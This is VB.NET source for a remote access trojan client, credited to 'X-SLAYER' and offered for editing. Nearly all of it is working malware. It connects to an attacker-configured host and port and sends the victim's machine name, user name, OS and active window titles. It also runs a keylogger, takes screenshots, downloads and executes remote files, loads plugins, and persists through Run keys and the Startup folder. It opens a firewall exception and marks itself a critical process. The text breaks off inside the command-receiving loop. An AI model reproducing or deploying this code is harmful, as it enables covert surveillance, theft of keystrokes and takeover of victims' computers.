Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.VisualBasic.Devices
Imports Microsoft.Win32
Imports System
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.IO
Imports System.IO.Compression
Imports System.Net
Imports System.Net.Sockets
Imports System.Reflection
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports System.Environment

'By X-SLAYER
'Feel Free To Edit
Public Class OK

    Shared Sub Main()

        Dim SSTUB As String


        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)

        SSTUB = Space(LOF(1))

        FileGet(1, SSTUB)

        FileClose(1)

        '############################################

        Dim SP As String() = Split(SSTUB, "|ST|")

        '##########################################

        VN = SP(1)

        H = SP(2)

        P = SP(3)

        Idr = SP(4)

        EXE = SP(5)

        DR = SP(6)

        message_statu = SP(7)

        message_title = SP(8)

        message_ms = SP(9)

        BD = SP(10)

        IsF = SP(11)

        Isu = SP(12)

        OK.ko()

    End Sub

    Private Shared Sub _Lambda__1(ByVal a0 As Object)
        OK.Ind(DirectCast(a0, Byte()))
    End Sub


    Private Shared Sub _Lambda__2(ByVal a0 As Object, ByVal a1 As SessionEndingEventArgs)
        OK.ED()
    End Sub

    Public Shared Function ACT() As String
        Dim str As String
        Try
            Dim foregroundWindow As IntPtr = OK.GetForegroundWindow
            If (foregroundWindow = IntPtr.Zero) Then
                Return ""
            End If
            Dim winTitle As String = Strings.Space((OK.GetWindowTextLength(CLng(foregroundWindow)) + 1))
            OK.GetWindowText(foregroundWindow, winTitle, winTitle.Length)
            str = OK.ENB(winTitle)
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            str = ""
            ProjectData.ClearProjectError()
        End Try
        Return str
    End Function

    Public Shared Function BS(ByRef B As Byte()) As String
        Return Encoding.UTF8.GetString(B)
    End Function

    Public Shared Function Cam() As Boolean
        Try
            Dim num As Integer = 0
            Do
                Dim lpszVer As String = Nothing
                If OK.capGetDriverDescriptionA(CShort(num), Strings.Space(100), 100, lpszVer, 100) Then
                    Return True
                End If
                num += 1
            Loop While (num <= 4)
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
        Return False
    End Function

    <DllImport("avicap32.dll", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Public Shared Function capGetDriverDescriptionA(ByVal wDriver As Short, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszName As String, ByVal cbName As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszVer As String, ByVal cbVer As Integer) As Boolean
    End Function

    Private Shared Function CompDir(ByVal F1 As FileInfo, ByVal F2 As FileInfo) As Boolean
        If (F1.Name.ToLower = F2.Name.ToLower) Then
            Dim directory As DirectoryInfo = F1.Directory
            Dim parent As DirectoryInfo = F2.Directory
            Do
                If (directory.Name.ToLower <> parent.Name.ToLower) Then
                    Return False
                End If
                directory = directory.Parent
                parent = parent.Parent
                If ((directory Is Nothing) And (parent Is Nothing)) Then
                    Return True
                End If
                If (directory Is Nothing) Then
                    Return False
                End If
            Loop While (Not parent Is Nothing)
        End If
        Return False
    End Function

    Public Shared Function connect() As Boolean
        OK.Cn = False
        Thread.Sleep(&H7D0)
        Dim lO As FileInfo = OK.LO
        SyncLock lO
            Try
                If (Not OK.C Is Nothing) Then
                    Try
                        OK.C.Close()
                        OK.C = Nothing
                    Catch exception1 As Exception
                        ProjectData.SetProjectError(exception1)
                        Dim exception As Exception = exception1
                        ProjectData.ClearProjectError()
                    End Try
                End If
                Try
                    OK.MeM.Dispose()
                Catch exception6 As Exception
                    ProjectData.SetProjectError(exception6)
                    Dim exception2 As Exception = exception6
                    ProjectData.ClearProjectError()
                End Try
            Catch exception7 As Exception
                ProjectData.SetProjectError(exception7)
                Dim exception3 As Exception = exception7
                ProjectData.ClearProjectError()
            End Try
            Try
                OK.MeM = New MemoryStream
                OK.C = New TcpClient
                OK.C.ReceiveBufferSize = &H32000
                OK.C.SendBufferSize = &H32000
                OK.C.Client.SendTimeout = &H2710
                OK.C.Client.ReceiveTimeout = &H2710
                OK.C.Connect(OK.H, Conversions.ToInteger(OK.P))
                OK.Cn = True
                OK.Send(OK.inf)
                Try
                    Dim str As String
                    If Operators.ConditionalCompareObjectEqual(OK.GTV("vn", ""), "", False) Then
                        str = (str & OK.DEB(OK.VN) & ChrW(13) & ChrW(10))
                    Else
                        str = (str & OK.DEB(Conversions.ToString(OK.GTV("vn", ""))) & ChrW(13) & ChrW(10))
                    End If
                    str = ((((((String.Concat(New String() {str, OK.H, ":", OK.P, ChrW(13) & ChrW(10)}) & OK.DR & ChrW(13) & ChrW(10)) & OK.EXE & ChrW(13) & ChrW(10)) & Conversions.ToString(OK.Idr) & ChrW(13) & ChrW(10)) & Conversions.ToString(OK.IsF) & ChrW(13) & ChrW(10)) & Conversions.ToString(OK.Isu) & ChrW(13) & ChrW(10)) & Conversions.ToString(OK.BD))
                    OK.Send(("inf" & OK.Y & OK.ENB(str)))
                Catch exception8 As Exception
                    ProjectData.SetProjectError(exception8)
                    Dim exception4 As Exception = exception8
                    ProjectData.ClearProjectError()
                End Try
            Catch exception9 As Exception
                ProjectData.SetProjectError(exception9)
                Dim exception5 As Exception = exception9
                OK.Cn = False
                ProjectData.ClearProjectError()
            End Try
        End SyncLock
        Return OK.Cn
    End Function

    Public Shared Function DEB(ByRef s As String) As String
        Return OK.BS(Convert.FromBase64String(s))
    End Function

    Public Shared Sub DLV(ByVal n As String)
        Try
            OK.F.Registry.CurrentUser.OpenSubKey(("Software\" & OK.RG), True).DeleteValue(n)
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Public Shared Sub ED()
        OK.pr(0)
    End Sub

    Public Shared Function ENB(ByRef s As String) As String
        Return Convert.ToBase64String(OK.SB(s))
    End Function

    <DllImport("user32.dll", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Public Shared Function GetForegroundWindow() As IntPtr
    End Function

    <DllImport("kernel32", EntryPoint:="GetVolumeInformationA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Private Shared Function GetVolumeInformation(<MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpRootPathName As String, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
    End Function

    <DllImport("user32.dll", EntryPoint:="GetWindowTextA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Public Shared Function GetWindowText(ByVal hWnd As IntPtr, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef WinTitle As String, ByVal MaxLength As Integer) As Integer
    End Function

    <DllImport("user32.dll", EntryPoint:="GetWindowTextLengthA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Public Shared Function GetWindowTextLength(ByVal hwnd As Long) As Integer
    End Function

    Public Shared Function GTV(ByVal n As String, ByVal ret As Object) As Object
        Dim obj2 As Object
        Try
            obj2 = OK.F.Registry.CurrentUser.OpenSubKey(("Software\" & OK.RG)).GetValue(n, RuntimeHelpers.GetObjectValue(ret))
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            obj2 = ret
            ProjectData.ClearProjectError()
        End Try
        Return obj2
    End Function

    Public Shared Function HWD() As String
        Dim str As String
        Try
            Dim num As Integer
            Dim lpVolumeNameBuffer As String = Nothing
            Dim lpMaximumComponentLength As Integer = 0
            Dim lpFileSystemFlags As Integer = 0
            Dim lpFileSystemNameBuffer As String = Nothing
            OK.GetVolumeInformation((Interaction.Environ("SystemDrive") & "\"), lpVolumeNameBuffer, 0, num, lpMaximumComponentLength, lpFileSystemFlags, lpFileSystemNameBuffer, 0)
            str = Conversion.Hex(num)
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            str = "ERR"
            ProjectData.ClearProjectError()
        End Try
        Return str
    End Function

    Public Shared Sub Ind(ByVal b As Byte())
        Dim strArray As String() = Strings.Split(OK.BS(b), OK.Y, -1, CompareMethod.Binary)
        Try
            Dim buffer As Byte()
            Dim str4 As String = strArray(0)
            Select Case str4
                Case "ll"
                    OK.Cn = False
                    Return
                Case "kl"
                    OK.Send(("kl" & OK.Y & OK.ENB(OK.kq.Logs)))
                    Return
                Case "prof"
                    Select Case strArray(1)
                        Case "~"
                            OK.STV(strArray(2), strArray(3), RegistryValueKind.String)
                            Exit Select
                        Case "!"
                            OK.STV(strArray(2), strArray(3), RegistryValueKind.String)
                            OK.Send(Conversions.ToString(Operators.ConcatenateObject((("getvalue" & OK.Y) & strArray(1) & OK.Y), OK.GTV(strArray(1), ""))))
                            Exit Select
                        Case "@"
                            OK.DLV(strArray(2))
                            Exit Select
                    End Select
                    Return
            End Select
            If (str4 <> "rn") Then
                GoTo Label_0294
            End If
            If (strArray(2).Chars(0) = ChrW(31)) Then
                Try
                    Dim stream As New MemoryStream
                    Dim length As Integer = (strArray(0) & OK.Y & strArray(1) & OK.Y).Length
                    stream.Write(b, length, (b.Length - length))
                    buffer = OK.ZIP(stream.ToArray)
                    GoTo Label_020B
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    OK.Send(("MSG" & OK.Y & "Execute ERROR"))
                    OK.Send("bla")
                    ProjectData.ClearProjectError()
                    Return
                End Try
            End If
            Dim client As New WebClient
            Try
                buffer = client.DownloadData(strArray(2))
            Catch exception10 As Exception
                ProjectData.SetProjectError(exception10)
                Dim exception2 As Exception = exception10
                OK.Send(("MSG" & OK.Y & "Download ERROR"))
                OK.Send("bla")
                ProjectData.ClearProjectError()
                Return
            End Try
Label_020B:
            OK.Send("bla")
            Dim pathH As String = (Path.GetTempFileName & "." & strArray(1))
            Try
                File.WriteAllBytes(pathH, buffer)
                Process.Start(pathH)
                OK.Send(("MSG" & OK.Y & "Executed As " & New FileInfo(pathH).Name))
                Return
            Catch exception11 As Exception
                ProjectData.SetProjectError(exception11)
                Dim exception3 As Exception = exception11
                OK.Send(("MSG" & OK.Y & "Execute ERROR " & exception3.Message))
                ProjectData.ClearProjectError()
                Return
            End Try
Label_0294:
            Select Case str4
                Case "inv"
                    Dim t As Byte() = DirectCast(OK.GTV(strArray(1), New Byte(0 - 1) {}), Byte())
                    If ((strArray(3).Length < 10) And (t.Length = 0)) Then
                        OK.Send(String.Concat(New String() {"pl", OK.Y, strArray(1), OK.Y, Conversions.ToString(1)}))
                    Else
                        If (strArray(3).Length > 10) Then
                            Dim stream2 As New MemoryStream
                            Dim offset As Integer = String.Concat(New String() {strArray(0), OK.Y, strArray(1), OK.Y, strArray(2), OK.Y}).Length
                            stream2.Write(b, offset, (b.Length - offset))
                            t = OK.ZIP(stream2.ToArray)
                            OK.STV(strArray(1), t, RegistryValueKind.Binary)
                        End If
                        OK.Send(String.Concat(New String() {"pl", OK.Y, strArray(1), OK.Y, Conversions.ToString(0)}))
                        Dim objectValue As Object = RuntimeHelpers.GetObjectValue(OK.Plugin(t, "A"))
                        NewLateBinding.LateSet(objectValue, Nothing, "h", New Object() {OK.H}, Nothing, Nothing)
                        NewLateBinding.LateSet(objectValue, Nothing, "p", New Object() {OK.P}, Nothing, Nothing)
                        NewLateBinding.LateSet(objectValue, Nothing, "osk", New Object() {strArray(2)}, Nothing, Nothing)
                        NewLateBinding.LateCall(objectValue, Nothing, "start", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
                        Do While Not Conversions.ToBoolean(Operators.OrObject(Not OK.Cn, Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue, Nothing, "Off", New Object(0 - 1) {}, Nothing, Nothing, Nothing), True, False)))
                            Thread.Sleep(1)
                        Loop
                        NewLateBinding.LateSet(objectValue, Nothing, "off", New Object() {True}, Nothing, Nothing)
                    End If
                    Return
                Case "ret"
                    Dim buffer3 As Byte() = DirectCast(OK.GTV(strArray(1), New Byte(0 - 1) {}), Byte())
                    If ((strArray(2).Length < 10) And (buffer3.Length = 0)) Then
                        OK.Send(String.Concat(New String() {"pl", OK.Y, strArray(1), OK.Y, Conversions.ToString(1)}))
                    Else
                        If (strArray(2).Length > 10) Then
                            Dim stream3 As New MemoryStream
                            Dim num3 As Integer = (strArray(0) & OK.Y & strArray(1) & OK.Y).Length
                            stream3.Write(b, num3, (b.Length - num3))
                            buffer3 = OK.ZIP(stream3.ToArray)
                            OK.STV(strArray(1), buffer3, RegistryValueKind.Binary)
                        End If
                        OK.Send(String.Concat(New String() {"pl", OK.Y, strArray(1), OK.Y, Conversions.ToString(0)}))
                        Dim instance As Object = RuntimeHelpers.GetObjectValue(OK.Plugin(buffer3, "A"))
                        OK.Send(String.Concat(New String() {"ret", OK.Y, strArray(1), OK.Y, OK.ENB(Conversions.ToString(NewLateBinding.LateGet(instance, Nothing, "GT", New Object(0 - 1) {}, Nothing, Nothing, Nothing)))}))
                    End If
                    Return
                Case "CAP"
                    Dim bounds As Rectangle = Screen.PrimaryScreen.Bounds
                    Dim image As New Bitmap(Screen.PrimaryScreen.Bounds.Width, bounds.Height, PixelFormat.Format16bppRgb555)
                    Dim g As Graphics = Graphics.FromImage(image)
                    Dim blockRegionSize As New Size(image.Width, image.Height)
                    g.CopyFromScreen(0, 0, 0, 0, blockRegionSize, CopyPixelOperation.SourceCopy)
                    Try
                        blockRegionSize = New Size(&H20, &H20)
                        bounds = New Rectangle(Cursor.Position, blockRegionSize)
                        Cursors.Default.Draw(g, bounds)
                    Catch exception12 As Exception
                        ProjectData.SetProjectError(exception12)
                        Dim exception4 As Exception = exception12
                        ProjectData.ClearProjectError()
                    End Try
                    g.Dispose()
                    Dim bitmap2 As New Bitmap(Conversions.ToInteger(strArray(1)), Conversions.ToInteger(strArray(2)))
                    g = Graphics.FromImage(bitmap2)
                    g.DrawImage(image, 0, 0, bitmap2.Width, bitmap2.Height)
                    g.Dispose()
                    Dim stream4 As New MemoryStream
                    b = OK.SB(("CAP" & OK.Y))
                    stream4.Write(b, 0, b.Length)
                    Dim stream5 As New MemoryStream
                    bitmap2.Save(stream5, ImageFormat.Jpeg)
                    Dim str2 As String = OK.md5(stream5.ToArray)
                    If (str2 <> OK.lastcap) Then
                        OK.lastcap = str2
                        stream4.Write(stream5.ToArray, 0, CInt(stream5.Length))
                    Else
                        stream4.WriteByte(0)
                    End If
                    OK.Sendb(stream4.ToArray)
                    stream4.Dispose()
                    stream5.Dispose()
                    image.Dispose()
                    bitmap2.Dispose()
                    Return
                Case "un"
                    Select Case strArray(1)
                        Case "~"
                            OK.UNS()
                            Exit Select
                        Case "!"
                            OK.pr(0)
                            ProjectData.EndApp()
                            Exit Select
                        Case "@"
                            OK.pr(0)
                            Process.Start(OK.LO.FullName)
                            ProjectData.EndApp()
                            Exit Select
                    End Select
                    Return
            End Select
            If (str4 <> "up") Then
                GoTo Label_0A1C
            End If
            Dim bytes As Byte() = Nothing
            If (strArray(1).Chars(0) = ChrW(31)) Then
                Try
                    Dim stream6 As New MemoryStream
                    Dim num4 As Integer = (strArray(0) & OK.Y).Length
                    stream6.Write(b, num4, (b.Length - num4))
                    bytes = OK.ZIP(stream6.ToArray)
                    GoTo Label_097B
                Catch exception13 As Exception
                    ProjectData.SetProjectError(exception13)
                    Dim exception5 As Exception = exception13
                    OK.Send(("MSG" & OK.Y & "Update ERROR"))
                    OK.Send("bla")
                    ProjectData.ClearProjectError()
                    Return
                End Try
            End If
            Dim client2 As New WebClient
            Try
                bytes = client2.DownloadData(strArray(1))
            Catch exception14 As Exception
                ProjectData.SetProjectError(exception14)
                Dim exception6 As Exception = exception14
                OK.Send(("MSG" & OK.Y & "Update ERROR"))
                OK.Send("bla")
                ProjectData.ClearProjectError()
                Return
            End Try
Label_097B:
            OK.Send("bla")
            Dim fileName As String = (path.GetTempFileName & ".exe")
            Try
                OK.Send(("MSG" & OK.Y & "Updating To " & New FileInfo(fileName).Name))
                Thread.Sleep(&H7D0)
                File.WriteAllBytes(fileName, bytes)
                Process.Start(fileName, "..")
            Catch exception15 As Exception
                ProjectData.SetProjectError(exception15)
                Dim exception7 As Exception = exception15
                OK.Send(("MSG" & OK.Y & "Update ERROR " & exception7.Message))
                ProjectData.ClearProjectError()
                Return
            End Try
            OK.UNS()
            Return
Label_0A1C:
            If (str4 = "Ex") Then
                If (OK.PLG Is Nothing) Then
                    OK.Send("PLG")
                    Dim num5 As Integer = 0
                    Do While Not (((Not OK.PLG Is Nothing) Or (num5 = 20)) Or Not OK.Cn)
                        num5 += 1
                        Thread.Sleep(&H3E8)
                    Loop
                    If ((OK.PLG Is Nothing) Or Not OK.Cn) Then
                        Return
                    End If
                End If
                Dim arguments As Object() = New Object() {b}
                Dim copyBack As Boolean() = New Boolean() {True}
                NewLateBinding.LateCall(OK.PLG, Nothing, "ind", arguments, Nothing, Nothing, copyBack, True)
                If copyBack(0) Then
                    b = DirectCast(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Byte())), Byte())
                End If
            ElseIf (str4 = "PLG") Then
                Dim stream7 As New MemoryStream
                Dim num6 As Integer = (strArray(0) & OK.Y).Length
                stream7.Write(b, num6, (b.Length - num6))
                OK.PLG = RuntimeHelpers.GetObjectValue(OK.Plugin(OK.ZIP(stream7.ToArray), "A"))
                NewLateBinding.LateSet(OK.PLG, Nothing, "H", New Object() {OK.H}, Nothing, Nothing)
                NewLateBinding.LateSet(OK.PLG, Nothing, "P", New Object() {OK.P}, Nothing, Nothing)
                NewLateBinding.LateSet(OK.PLG, Nothing, "c", New Object() {OK.C}, Nothing, Nothing)
            End If
        Catch exception16 As Exception
            ProjectData.SetProjectError(exception16)
            Dim exception8 As Exception = exception16
            If ((strArray.Length > 0) AndAlso ((strArray(0) = "Ex") Or (strArray(0) = "PLG"))) Then
                OK.PLG = Nothing
            End If
            Try
                OK.Send(String.Concat(New String() {"ER", OK.Y, strArray(0), OK.Y, exception8.Message}))
            Catch exception17 As Exception
                ProjectData.SetProjectError(exception17)
                Dim exception9 As Exception = exception17
                ProjectData.ClearProjectError()
            End Try
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Public Shared Function inf() As String
        Dim str2 As String = ("ll" & OK.Y)
        Try
            If Operators.ConditionalCompareObjectEqual(OK.GTV("vn", ""), "", False) Then
                str2 = (str2 & OK.ENB((OK.DEB(OK.VN) & "_" & OK.HWD)) & OK.Y)
            Else
                str2 = (str2 & OK.ENB((OK.DEB(Conversions.ToString(OK.GTV("vn", ""))) & "_" & OK.HWD)) & OK.Y)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            str2 = (str2 & OK.ENB(OK.HWD) & OK.Y)
            ProjectData.ClearProjectError()
        End Try
        Try
            str2 = (str2 & Environment.MachineName & OK.Y)
        Catch exception9 As Exception
            ProjectData.SetProjectError(exception9)
            Dim exception2 As Exception = exception9
            str2 = (str2 & "??" & OK.Y)
            ProjectData.ClearProjectError()
        End Try
        Try
            str2 = (str2 & Environment.UserName & OK.Y)
        Catch exception10 As Exception
            ProjectData.SetProjectError(exception10)
            Dim exception3 As Exception = exception10
            str2 = (str2 & "??" & OK.Y)
            ProjectData.ClearProjectError()
        End Try
        Try
            str2 = (str2 & OK.LO.LastWriteTime.Date.ToString("yy-MM-dd") & OK.Y)
        Catch exception11 As Exception
            ProjectData.SetProjectError(exception11)
            Dim exception4 As Exception = exception11
            str2 = (str2 & "??-??-??" & OK.Y)
            ProjectData.ClearProjectError()
        End Try
        str2 = (str2 & "" & OK.Y)
        Try
            str2 = (str2 & OK.F.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win"))
        Catch exception12 As Exception
            ProjectData.SetProjectError(exception12)
            Dim exception5 As Exception = exception12
            str2 = (str2 & "??")
            ProjectData.ClearProjectError()
        End Try
        str2 = (str2 & "SP")
        Try
            Dim strArray As String() = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, CompareMethod.Binary)
            If (strArray.Length = 1) Then
                str2 = (str2 & "0")
            End If
            str2 = (str2 & strArray((strArray.Length - 1)))
        Catch exception13 As Exception
            ProjectData.SetProjectError(exception13)
            Dim exception6 As Exception = exception13
            str2 = (str2 & "0")
            ProjectData.ClearProjectError()
        End Try
        Try
            If Environment.GetFolderPath(SpecialFolder.ProgramFiles).Contains("x86") Then
                str2 = (str2 & " x64" & OK.Y)
            Else
                str2 = (str2 & " x86" & OK.Y)
            End If
        Catch exception14 As Exception
            ProjectData.SetProjectError(exception14)
            Dim exception7 As Exception = exception14
            str2 = (str2 & OK.Y)
            ProjectData.ClearProjectError()
        End Try
        If OK.Cam Then
            str2 = (str2 & "Yes" & OK.Y)
        Else
            str2 = (str2 & "No" & OK.Y)
        End If
        str2 = (((str2 & OK.VR & OK.Y) & ".." & OK.Y) & OK.ACT & OK.Y)
        Dim str3 As String = ""
        Try
            Dim str4 As String
            For Each str4 In OK.F.Registry.CurrentUser.CreateSubKey(("Software\" & OK.RG), RegistryKeyPermissionCheck.Default).GetValueNames
                If (str4.Length = &H20) Then
                    str3 = (str3 & str4 & ",")
                End If
            Next
        Catch exception15 As Exception
            ProjectData.SetProjectError(exception15)
            Dim exception8 As Exception = exception15
            ProjectData.ClearProjectError()
        End Try
        Return (str2 & str3)
    End Function

    Public Shared Sub INS()

        If message_statu = "True" Then
            MsgBox(message_ms, MsgBoxStyle.Exclamation, message_title)
        End If

        Thread.Sleep(&H3E8)
        If (OK.Idr AndAlso Not OK.CompDir(OK.LO, New FileInfo((Interaction.Environ(OK.DR).ToLower & "\" & OK.EXE.ToLower)))) Then
            Try
                If File.Exists((Interaction.Environ(OK.DR) & "\" & OK.EXE)) Then
                    File.Delete((Interaction.Environ(OK.DR) & "\" & OK.EXE))
                End If
                Dim stream As New FileStream((Interaction.Environ(OK.DR) & "\" & OK.EXE), FileMode.CreateNew)
                Dim array As Byte() = File.ReadAllBytes(OK.LO.FullName)
                stream.Write(array, 0, array.Length)
                stream.Flush()
                stream.Close()
                OK.LO = New FileInfo((Interaction.Environ(OK.DR) & "\" & OK.EXE))
                Process.Start(OK.LO.FullName)
                ProjectData.EndApp()
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.EndApp()
                ProjectData.ClearProjectError()
            End Try
        End If
        Try
            Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User)
        Catch exception7 As Exception
            ProjectData.SetProjectError(exception7)
            Dim exception2 As Exception = exception7
            ProjectData.ClearProjectError()
        End Try
        Try
            Interaction.Shell(String.Concat(New String() {"netsh firewall add allowedprogram """, OK.LO.FullName, """ """, OK.LO.Name, """ ENABLE"}), AppWinStyle.Hide, True, &H1388)
        Catch exception8 As Exception
            ProjectData.SetProjectError(exception8)
            Dim exception3 As Exception = exception8
            ProjectData.ClearProjectError()
        End Try
        If OK.Isu Then
            Try
                OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, True).SetValue(OK.RG, ("""" & OK.LO.FullName & """ .."))
            Catch exception9 As Exception
                ProjectData.SetProjectError(exception9)
                Dim exception4 As Exception = exception9
                ProjectData.ClearProjectError()
            End Try
            Try
                OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, True).SetValue(OK.RG, ("""" & OK.LO.FullName & """ .."))
            Catch exception10 As Exception
                ProjectData.SetProjectError(exception10)
                Dim exception5 As Exception = exception10
                ProjectData.ClearProjectError()
            End Try
        End If
        If OK.IsF Then
            Try
                File.Copy(OK.LO.FullName, (Environment.GetFolderPath(SpecialFolder.Startup) & "\" & OK.RG & ".exe"), True)
                OK.FS = New FileStream((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & OK.RG & ".exe"), FileMode.Open)
            Catch exception11 As Exception
                ProjectData.SetProjectError(exception11)
                Dim exception6 As Exception = exception11
                ProjectData.ClearProjectError()
            End Try
        End If
    End Sub

    Public Shared Sub ko()
        If (Not Interaction.Command Is Nothing) Then
            Try
                OK.F.Registry.CurrentUser.SetValue("di", "!")
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
            Thread.Sleep(&H1388)
        End If
        Dim createdNew As Boolean = False
        OK.MT = New Mutex(True, OK.RG, createdNew)
        If Not createdNew Then
            ProjectData.EndApp()
        End If
        OK.INS()
        If Not OK.Idr Then
            OK.EXE = OK.LO.Name
            OK.DR = OK.LO.Directory.Name
        End If
        Dim FfFfyA As New Thread(New ThreadStart(AddressOf OK.RC), 1) : FfFfyA.Start()
        Try
            OK.kq = New kl
            Dim NbVvJHj As New Thread(New ThreadStart(AddressOf OK.kq.WRK), 1) : NbVvJHj.Start()
        Catch exception8 As Exception
            ProjectData.SetProjectError(exception8)
            Dim exception2 As Exception = exception8
            ProjectData.ClearProjectError()
        End Try
        Dim num As Integer = 0
        Dim str As String = ""
        If OK.BD Then
            Try
                AddHandler SystemEvents.SessionEnding, New SessionEndingEventHandler(AddressOf OK._Lambda__2)
                OK.pr(1)
            Catch exception9 As Exception
                ProjectData.SetProjectError(exception9)
                Dim exception3 As Exception = exception9
                ProjectData.ClearProjectError()
            End Try
        End If
        Do While True
            Thread.Sleep(&H3E8)
            If Not OK.Cn Then
                str = ""
            End If
            Application.DoEvents()
            Try
                num += 1
                If (num = 5) Then
                    Try
                        Process.GetCurrentProcess.MinWorkingSet = CType(&H400, IntPtr)
                    Catch exception10 As Exception
                        ProjectData.SetProjectError(exception10)
                        Dim exception4 As Exception = exception10
                        ProjectData.ClearProjectError()
                    End Try
                End If
                If (num >= 8) Then
                    num = 0
                    Dim str2 As String = OK.ACT
                    If (str <> str2) Then
                        str = str2
                        OK.Send(("act" & OK.Y & str2))
                    End If
                End If
                If OK.Isu Then
                    Try
                        If Operators.ConditionalCompareObjectNotEqual(OK.F.Registry.CurrentUser.GetValue((OK.sf & "\" & OK.RG), ""), ("""" & OK.LO.FullName & """ .."), False) Then
                            OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, True).SetValue(OK.RG, ("""" & OK.LO.FullName & """ .."))
                        End If
                    Catch exception11 As Exception
                        ProjectData.SetProjectError(exception11)
                        Dim exception5 As Exception = exception11
                        ProjectData.ClearProjectError()
                    End Try
                    Try
                        If Operators.ConditionalCompareObjectNotEqual(OK.F.Registry.LocalMachine.GetValue((OK.sf & "\" & OK.RG), ""), ("""" & OK.LO.FullName & """ .."), False) Then
                            OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, True).SetValue(OK.RG, ("""" & OK.LO.FullName & """ .."))
                        End If
                    Catch exception12 As Exception
                        ProjectData.SetProjectError(exception12)
                        Dim exception6 As Exception = exception12
                        ProjectData.ClearProjectError()
                    End Try
                End If
            Catch exception13 As Exception
                ProjectData.SetProjectError(exception13)
                Dim exception7 As Exception = exception13
                ProjectData.ClearProjectError()
            End Try
        Loop
    End Sub

    Public Shared Function md5(ByVal B As Byte()) As String
        B = New MD5CryptoServiceProvider().ComputeHash(B)
        Dim str2 As String = ""
        Dim num As Byte
        For Each num In B
            str2 = (str2 & num.ToString("x2"))
        Next
        Return str2
    End Function

    <DllImport("ntdll")> _
    Private Shared Function NtSetInformationProcess(ByVal hProcess As IntPtr, ByVal processInformationClass As Integer, ByRef processInformation As Integer, ByVal processInformationLength As Integer) As Integer
    End Function

    Public Shared Function Plugin(ByVal b As Byte(), ByVal c As String) As Object
        Dim [module] As [Module]
        For Each [module] In Assembly.Load(b).GetModules
            Dim type As Type
            For Each type In [module].GetTypes
                If type.FullName.EndsWith(("." & c)) Then
                    Return [module].Assembly.CreateInstance(type.FullName)
                End If
            Next
        Next
        Return Nothing
    End Function

    Public Shared Sub pr(ByVal i As Integer)
        Try
            OK.NtSetInformationProcess(Process.GetCurrentProcess.Handle, &H1D, i, 4)
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Public Shared Sub RC()
Label_0000:
        OK.lastcap = ""
        If (Not OK.C Is Nothing) Then
            Dim num As Long = -1
            Dim num2 As Integer = 0
            Try
Label_001B:
                num2 += 1
                If (num2 = 10) Then
                    num2 = 0
                    Thread.Sleep(1)
                End If
                If Not OK.Cn Then
                    GoTo Label_01C1
                End If
                If (OK.C.Available < 1) Then
                    OK.C.Client.Poll(-1, SelectMode.SelectRead)
                End If
Label_0057:
                If (OK.C.Available > 0) Then
                    If (num = -1) Then
                        Dim str As String = ""
                        Do While True
                            Dim charCode As Integer = OK.C.GetStream.ReadByte
                            Select Case charCode
                                Case -1
                                    GoTo Label_01C1
                                Case 0
                                    num = Conversions.ToLong(str)
                                    str = ""
                                    If (num = 0) Then
                                        OK.Send("")
                                        num = -1
                                    End If
                                    If (OK.C.Available <= 0) Then
                                        GoTo Label_001B
                                    End If
                                    GoTo Label_0057
                            End Select
                            str = (str & Conversions.ToString(Conversions.ToInteger(Strings.ChrW(charCode).ToString)))
                        Loop
                    End If
